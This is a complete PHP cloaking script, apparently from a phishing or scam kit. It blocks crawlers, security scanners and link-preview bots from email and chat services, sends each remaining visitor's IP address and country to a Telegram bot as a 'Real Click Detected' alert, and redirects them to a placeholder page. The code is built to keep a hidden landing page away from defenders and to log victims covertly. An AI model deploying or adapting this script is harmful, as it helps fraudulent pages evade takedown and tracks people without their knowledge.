<?php
// dev Frenzyyy12
$bot_token = 'BOT_TOKEN';
$chat_id = 'CHAT_ID';
$redirect_url = 'https://your.site/web/index.html';

function countryCodeToEmoji($countryCode) {
    if (strlen($countryCode) !== 2) return '';
    $offset = 0x1F1E6 - ord('A');
    $firstChar = mb_substr($countryCode, 0, 1);
    $secondChar = mb_substr($countryCode, 1, 1);
    return 
        mb_chr(ord(strtoupper($firstChar)) + $offset) .
        mb_chr(ord(strtoupper($secondChar)) + $offset);
}

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$accept_header = $_SERVER['HTTP_ACCEPT'] ?? '';
$connection = $_SERVER['HTTP_CONNECTION'] ?? '';
$upgrade_insecure_requests = $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? '';

if (
    empty($user_agent) || empty($accept_language) || empty($accept_header)
    || empty($connection) || empty($upgrade_insecure_requests)
) {
    header('HTTP/1.1 403 Forbidden');
    exit('Access denied - missing required headers');
}

$blocked_agents = [
    'bot', 'crawler', 'spider', 'curl', 'wget', 'python', 'scraper', 'scanner',
    'headlesschrome', 'phantomjs', 'bingpreview', 'mediapartners-google', 'slurp',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'embedly', 'quora link preview',
    'showyoubot', 'outbrain', 'pinterestbot', 'developers.google.com/+/web/snippet',
    'applebot', 'yandexbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'mj12bot', 'blexbot',
    'outlook-iop', 'outlook.com', 'mail.ru_bot', 'telegrambot', 'discordbot', 'bitlybot',
    'facebookcatalog', 'twitterbot', 'snapbot', 'pingdom', 'facebookplatform', 'curl', 
    'libwww-perl', 'python-requests', 'okhttp', 'dalvik', 'headless', 'w3c_validator',
    'panscient', 'gigabot', 'ia_archiver', 'exabot', 'mediapartners-google',
    'python-urllib', 'urllib', 'googlebot', 'baiduspider', 'yandex', 'mj12bot', 
    'semrush', 'ahrefs', 'dotbot', 'blexbot', 'seznambot', 'sogou', 'facebookexternalhit',
    'google favicon', 'pingdom.com_bot', 'linkedinbot', 'twitterbot', 'slackbot',
    'discordbot', 'embedly', 'quora link preview', 'facebookcatalog', 'telegrambot',
    'apis-google', 'petalbot', 'duckduckbot', 'applebot', 'screaming frog', 'sitebulb',
];

foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header('HTTP/1.1 403 Forbidden');
        exit('Access denied - bot detected');
    }
}


$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';


$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$country = ($geo && $geo->status === "success") ? $geo->country : "Unknown";
$countryCode = ($geo && $geo->status === "success") ? $geo->countryCode : "";
$flagEmoji = countryCodeToEmoji($countryCode);

$date = date('Y-m-d');
$time = date('H:i:s');


$message = "𝐑𝐞𝐚𝐥 𝐂𝐥𝐢𝐜𝐤 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝 ✅\n" .
           "𝗜𝗣 📍  : {$ip}\n" .
           "𝗖𝗼𝘂𝗻𝘁𝗿𝘆  : {$flagEmoji} | {$country}\n" .
           "𝗧𝗶𝗺𝗲 ⏰ : {$date} | {$time}";


$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$data = http_build_query([
    'chat_id' => $chat_id,
    'text' => $message,
]);
$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
        'timeout' => 3,
    ],
];
$context = stream_context_create($options);
@file_get_contents($url, false, $context);

header("Location: $redirect_url");
exit;

